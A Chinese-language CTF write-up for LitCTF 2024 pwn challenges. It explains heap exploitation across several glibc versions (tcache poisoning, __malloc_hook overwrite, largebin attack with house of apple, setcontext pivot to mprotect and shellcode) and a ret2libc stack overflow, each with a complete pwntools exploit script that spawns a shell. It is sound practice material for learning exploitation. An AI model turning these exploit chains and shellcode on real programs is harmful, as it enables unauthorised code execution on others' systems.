---
title: LitCTF2024-wp
date: 2024-06-03 00:43:27
category: wp
tags:
---
# Pwn
## heap-2.23
### 思路

glibc2.23，没有tcache，delete函数中有个UAF漏洞

1. 利用unsorted bin 泄露libc基址
2. 修改释放到fastbin的堆块的fd指针，利用错位出0x7f绕过fastbin的分配检测，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp
```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node3.anna.nssctf.cn",28132)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)


# leak libc_base
create(0,0x200)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 3951480
log.success(hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0xf1247

create(2,0x68)
create(3,0x68)
delete(2)
edit(2,p64(malloc_hook-0x23))

create(4,0x68)
create(5,0x68)

edit(5,b'a'*0x13+p64(one_gadget))

#gdb.attach(p)

create(6,0x10)

p.interactive()
```



## heap-2.27
### 思路

glibc2.27，有tcache了，还是一样的程序
思路和2.23差不多,不过要注意tcache的next指针指向的不是chunk头的位置，而是用户内存的位置，此外甚至没有任何保护，比2.23还简单

1. 利用unsorted bin 泄露libc基址
2. 修改释放到tcache的堆块的next指针，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp

```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node1.anna.nssctf.cn",28695)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)

# gadget
one_gadget_l = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 4111520 
log.success("libc_base: " + hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + one_gadget_l[3]

create(2,0x68)
delete(2)
edit(2,p64(malloc_hook))

create(3,0x68)
create(4,0x68)

edit(4,p64(one_gadget))
create(5,0x10)

p.interactive()
```

## heap-2.31

### 思路

glibc2.31，tcache加了个count检测，只要多释放一个堆块就好

1. 利用unsorted bin 泄露libc基址
2. 修改释放到tcache的堆块的next指针，使堆分配到`__malloc_hook`附近，覆盖 `__malloc_hook`为one_gadget
3. 执行malloc获取shell

### exp

```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")
#p = remote("node2.anna.nssctf.cn",28596)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)

# gadget
one_gadget1 = 0xe3afe
one_gadget2 = 0xe3b01 
one_gadget3 = 0xe3b04

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)

p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 2018272
log.success("libc_base: " + hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + one_gadget2

create(2,0x68)
create(3,0x68)
delete(3)
delete(2)
edit(2,p64(malloc_hook))

create(4,0x68)
create(5,0x68)

edit(5,p64(one_gadget))
create(6,0x10)

p.interactive()
```

## heap-2.35
### 思路1

glibc2.35，tcache的next指针指向经PROTECT_PTR处理的指针，并且加了内存对齐检测
取消了hook机制，虽然libc中仍然有这些符号，但已经没有作用了
- __free_hook
- __malloc_hook
- __realloc_hook
- __memalign_hook
- __after_morecore_hook

1. 利用unsorted bin 泄露libc基址
2. 利用tcache的PROTECT_PTR机制泄露堆地址，调试计算heap基址
3. 利用environ泄露栈地址
这里想直接覆盖到edit函数的返回地址的，但是由于内存对齐，只能覆盖到rbp。往上是canary，往下覆盖不到返回地址
但create函数栈帧和edit函数相同，覆盖到rbp又会导致create函数创建堆时将返回地址当成tcache key从而置为0
4. 利用栈泄露ptr地址
5. 将堆分配到ptr上，修改某个堆块的指针，修改为edit返回地址的地址
6. 然后写个rop的链子，成功getshell

### exp1
```python
from pwn import *

#context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'

p = process("./heap")

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def create(index,size):
        p.sendlineafter(b">>",b'1')
        p.sendlineafter(b'idx? ',str(index).encode())
        p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
        p.sendlineafter(b">>",b'2')
        p.sendlineafter(b'idx? ',str(index).encode())

def show(index):
        p.sendlineafter(b">>",b'3')
        p.sendlineafter(b'idx? ',str(index).encode())

def edit(index,content):
        p.sendlineafter(b">>",b'4')
        p.sendlineafter(b'idx? ',str(index).encode())
        p.sendlineafter(b'content : ',content)

# leak libc_base
create(0,0x1000)
create(1,0x10)
delete(0)
show(0)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 2206944
log.success("libc_base: " + hex(libc_base))

# leak heap_base
delete(1)
show(1)
p.recvuntil(b'content : ')
leak = u64(p.recv(5).ljust(8,b'\x00'))
heap_base = (leak<<12)-0x1000
log.success("heap_base : " + hex(heap_base))

environ = libc_base + libc.sym['environ']
pop_rdi = libc_base + 0x2a3e5
ret = libc_base + 0x2a3e6
system_addr = libc_base + libc.sym['system'] 
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

create(2,0x60)
create(3,0x60)
delete(3)
delete(2)
edit(2,p64(environ^((heap_base+0x2a0)>>12)))

# leak stack
create(4,0x60)
create(5,0x60)
show(5)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
stack_addr = leak-0x128
log.success('stack_addr : '+hex(stack_addr))

create(6,0x90)
create(7,0x90)
delete(7)
delete(6)
edit(6,p64(stack_addr^((heap_base+0x000380)>>12)))

# leak ptr
create(8,0x90)
create(9,0x90)
payload = cyclic(0x18)
edit(9,payload)
show(9)
p.recvuntil(b'content : ')
leak = u64(p.recv(0x18+6)[-6:].ljust(8,b'\x00'))
ptr = leak + 0x002956 
log.success('ptr : ' + hex(ptr))

create(10,0xa0)
create(11,0xa0)
delete(11)
delete(10)
edit(10, p64(ptr^((heap_base+0x4c0)>>12)))

create(12,0xa0)
create(13,0xa0)

target = stack_addr - 0x18
edit(13,p64(target))
log.info('target : ' + hex(target))

edit(0,p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr))

p.interactive()
```

### 思路2
最近学了`house of apple`，所以用`house of apple`重新做了这道题

泄露`libc_base`和`heap_base`的部分没有太大变化
后面利用`largebin attack`在`_IO_list_all`的地方写上伪造的IO_FILE_plus
然后利用mprotect函数修改堆上的执行权限，最后在堆上执行shellcode

### exp2
```python
from pwn import *

# context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'
context.arch = 'amd64'

p = process("./heap")
#p = remote("node2.anna.nssctf.cn",28596)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def add(index,size):
    p.sendlineafter(b">>",b'1')
    p.sendlineafter(b'idx? ',str(index).encode())
    p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
    p.sendlineafter(b">>",b'2')
    p.sendlineafter(b'idx? ',str(index).encode())

def show(index):
    p.sendlineafter(b">>",b'3')
    p.sendlineafter(b'idx? ',str(index).encode())

def edit(index,content):
    p.sendlineafter(b">>",b'4')
    p.sendlineafter(b'idx? ',str(index).encode())
    p.sendlineafter(b'content : ',content)

def Exit():
    p.sendlineafter(b">>",b'5')

add(0,0x500)
add(1,0x10)
delete(0)
show(0)
p.recvuntil(b'content : ')
libc_addr = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = libc_addr - 0x21ace0
log.success("libc_base -> " + hex(libc_base))

add(2,0x4e0)
edit(0,b'a'*0x10)
show(0)
p.recvuntil(b'a'*0x10)
heap_addr = u64(p.recv(6).ljust(8,b'\x00'))
heap_base = heap_addr - 0x20a
log.success("heap_base -> " + hex(heap_base))

add(3,0x10)
add(4,0x710)
add(5,0x10)
add(6,0x700)
add(7,0x10)
delete(4)
add(8,0x900)
delete(6)
edit(4,p64(libc_base+0x21b190)+p64(libc_base+0x21b190)+p64(heap_base+0x7c0)+p64(libc_base+libc.sym['_IO_list_all']-0x20))
add(9,0x900)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
fake_IO_FILE = heap_base + 0xf00

f = flat({
    0x0: 0, # _flags
    0x8: 0, # _IO_read_ptr
    0x10: 0, # _IO_read_end
    0x18: 0, # _IO_read_base
    0x20: 0, # _IO_write_base
    0x28: 1, # _IO_write_ptr
    0x30: 0, # _IO_write_end
    0x38: fake_IO_FILE + 0x280, # _IO_buf_base
    0x40: 0, # _IO_buf_end
    0x48: 0, # _IO_save_base
    0x50: 0, # _IO_backup_base
    0x58: 0, # _IO_save_end
    0x60: 0, # markers
    0x68: 0, # _chain
    0x70: p32(0), # _fileno
    0x74: p32(0), # _flags2
    0x78: 0, # _old_offset
    0x80: p16(0), # _cur_column
    0x82: p8(0), # _vtable_offset
    0x83: p8(0), # _shortbuf
    0x88: 0, # _lock
    0x90: 0, # _offset
    0x98: 0, # _codecvt
    0xa0: fake_IO_FILE + 0xe0, # _wide_data
    0xa8: 0, # _freeres_list
    0xb0: 0, # _freeres_buf
    0xb8: 0, # __pad5
    0xc0: p32(0), # _mode
    0xc4: 0, # _unused2
    0xd8: libc_base + 0x2170c0, #_vtables
    }, filler = b'\x00')

data = bytes(f).ljust(0xe0, b"\x00")

data += b"\x00" * 0xe0
data += p64(fake_IO_FILE + 0x200)
data = data.ljust(0x200, b"\x00")

data += b"\x00" * 0x68
data += p64(libc_base + 0x15d48a) # 0x000000000015d48a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]   
data = data.ljust(0x280, b"\x00")

data += p64(fake_IO_FILE + 0x2a0)
data += p64(0)
data += p64(libc_base + 0x162f64) # 0x0000000000162f64 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
data = data.ljust(0x2a0, b"\x00")

data += p64(0)
data += p64(fake_IO_FILE + 0x2e0)
data += p64(libc_base + 0x167420) + b"\x00"*0x20 # 0x0000000000167420 mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20]
data += p64(fake_IO_FILE + 0x2a0)
data = data.ljust(0x2e0, b"\x00")

data += p64(libc_base + 0xd2ba5)+0x18*b"\x00" # add rsp,0x20 ; pop rbx ; ret
data += p64(libc_base + 0x5a120)+0x8*b"\x00" # mov_rsp_rdx

data += p64(libc_base + 0x2a3e5) # pop_rdi
data += p64(heap_base)
data += p64(libc_base + 0x2be51) # pop_rsi
data += p64(0x10000)
data += p64(libc_base + 0x904a9) # pop_rdx_rbx
data += p64(7)
data += p64(0)
data += p64(libc.sym['mprotect'] + libc_base)
data += p64(fake_IO_FILE + 0x380)
data = data.ljust(0x380, b"\x00")
data += shellcode

edit(6,data[0x10:])

Exit()

p.interactive()

```

## heap-2.39
### 思路
之前一直没补上这题，学完`house of apple`后正好拿这两题练手

这题多加了一点限制，只能申请大于0x4f0、小于0x1000的堆块，和上题的exp2差不多，只是需要将用于分隔堆块的小堆块调大一点
同时还需要重新找gadget

### exp
```python
from pwn import *

context.terminal =['tmux','splitw','-h']
context.log_level = 'debug'
context.arch = 'amd64'

# p = process("./heap")
p = remote("node4.anna.nssctf.cn",28313)

elf = ELF("./heap")
libc = ELF("./libc.so.6")

def add(index,size):
	p.sendlineafter(b">>",b'1')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'size? ',str(size).encode())

def delete(index):
	p.sendlineafter(b">>",b'2')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def show(index):
	p.sendlineafter(b">>",b'3')
	p.sendlineafter(b'idx? ',str(index).encode())
	
def edit(index,content):
	p.sendlineafter(b">>",b'4')
	p.sendlineafter(b'idx? ',str(index).encode())
	p.sendlineafter(b'content : ',content)

def Exit():
    p.sendlineafter(b">>",b'5')

# leak libc_base
add(0,0x500)
add(1,0x500)
add(2,0x500)
add(3,0x500)
delete(0)
show(0)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak-0x203b20
log.success("libc_base => " + hex(libc_base))

# leak heap_base
delete(2)
show(2)
p.recvuntil(b'content : ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
heap_base = leak-0x290
log.success("heap_base => " + hex(heap_base))

add(4,0x500)
add(5,0x500)

add(6,0x710)
add(7,0x510)
add(8,0x700)
add(9,0x510)

delete(6)
add(10,0x900)
delete(8)
edit(6,p64(libc_base+0x21b190)+p64(libc_base+0x21b190)+p64(heap_base+0x2310)+p64(libc_base+libc.sym['_IO_list_all']-0x20))
add(11,0x900)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
fake_IO_FILE = heap_base + 0x2310

f = flat({
	0x0: 0, # _flags
	0x8: 0, # _IO_read_ptr 
	0x10: 0, # _IO_read_end
	0x18: 0, # _IO_read_base
    0x20: 0, # _IO_write_base
    0x28: 1, # _IO_write_ptr
	0x30: 0, # _IO_write_end
	0x38: fake_IO_FILE + 0x280, # _IO_buf_base
	0x40: 0, # _IO_buf_end
	0x48: 0, # _IO_save_base
	0x50: 0, # _IO_backup_base
	0x58: 0, # _IO_save_end
	0x60: 0, # markers
	0x68: 0, # _chain
    0x70: 0, # _fileno
	0x78: 0, # _flags2
	0x80: 0, # _old_offset
	0x88: fake_IO_FILE, # _cur_column
	0x90: 0, # _vtable_offset
	0x98: 0, # _shortbuf
	0xa0: fake_IO_FILE + 0xe0, # _lock
	0xa8: 0, # _offset
	0xb0: 0, # _codecvt
	0xb8: fake_IO_FILE + 0xe0, # _wide_data
    0xc0: 0, # _freeres_list
	0xc8: 0, # _freeres_buf
	0xd0: 0, # __pad5
    0xd8: libc_base + 0x202228, #_vtables
	}, filler = b'\x00')

data = bytes(f).ljust(0xe0, b"\x00")

data += b"\x00" * 0xe0
data += p64(fake_IO_FILE + 0x200)
data = data.ljust(0x200, b"\x00")

data += b"\x00" * 0x68
data += p64(libc_base + 0x16c22c) # 0x000000000016c22c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
data = data.ljust(0x280, b"\x00")

data += p64(0)*2
data += p64(libc_base + 0x176f0e) # 0x0000000000176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
data += p64(0)*4
data += p64(fake_IO_FILE + 0x300)
data = data.ljust(0x300, b"\x00")

setcontext = flat({
	0x20: libc_base + 0x4a98d, # setcontext+61
	0xa0: fake_IO_FILE+0x400, # mov rsp,QWORD PTR [rdx+0xa0]
	0x80: 0, # mov rbx,QWORD PTR [rdx+0x80]
	0x78: 0, # mov rbp,QWORD PTR [rdx+0x78]
	0x48: 0, # mov r12,QWORD PTR [rdx+0x48]
	0x50: 0, # mov r13,QWORD PTR [rdx+0x50]
	0x58: 0, # mov r14,QWORD PTR [rdx+0x58]
	0x60: 0, # mov r15,QWORD PTR [rdx+0x60]
	0xa8: libc_base + 0x2882f, # mov rcx,QWORD PTR [rdx+0xa8] ; push rcx # 0x000000000002882f : ret
	0x70: 0, # mov rsi,QWORD PTR [rdx+0x70]
	0x68: 0, # mov rdi,QWORD PTR [rdx+0x68]
	0x98: 0, # mov rcx,QWORD PTR [rdx+0x98] 
	0x28: 0, # mov r8,QWORD PTR [rdx+0x28]
	0x30: 0, # mov r9,QWORD PTR [rdx+0x30]
	0x88: 0, # mov rdx,QWORD PTR [rdx+0x88]
	},filler = b'\x00')

data += setcontext
data = data.ljust(0x400, b"\x00")

data += p64(libc_base + 0x10f75b) # 0x000000000010f75b : pop rdi ; ret
data += p64(heap_base)
data += p64(libc_base + 0x110a4d) # 0x0000000000110a4d : pop rsi ; ret
data += p64(0x10000)
data += p64(libc_base + 0x66b9a) # 0x0000000000066b9a : pop rdx ; ret 0x19
data += p64(7)
data += p64(libc.sym['mprotect'] + libc_base)
data += b'\x00'*0x19
data += p64(fake_IO_FILE + 0x600)
data = data.ljust(0x600, b"\x00")
data += shellcode

edit(8,data[0x10:])

Exit()

p.interactive()
```


## ATM
### 思路

栈题，先用函数3扩展能写的字节数，在执行函数5，最后用函数4返回

printf函数地址都给了，直接ret2libc

### exp

```python
from pwn import *

context.log_level = 'debug'

#p = process("./app")
p = remote("node2.anna.nssctf.cn",28166)
elf = ELF("./app")

p.recvuntil(b'password:')
p.sendline(b'aaaaaa')

p.recvuntil(b'4.Exit\n')
p.sendline(b'3')

p.recvuntil(b'deposit:')
p.send(b'1111111')

p.recvuntil(b'4.Exit\n')
p.sendline(b'5')

p.recvuntil(b'gift:')
printf_addr = int(p.recv(18),16)

printf_offset = 0x064770
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success("libc_base: " + hex(libc_base) )

pop_rdi = 0x401233
ret = 0x401234

payload = b'a'*360 + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system_addr)  
p.sendline(payload)

p.recvuntil(b'4.Exit\n')
p.sendline(b'4')

p.interactive()
```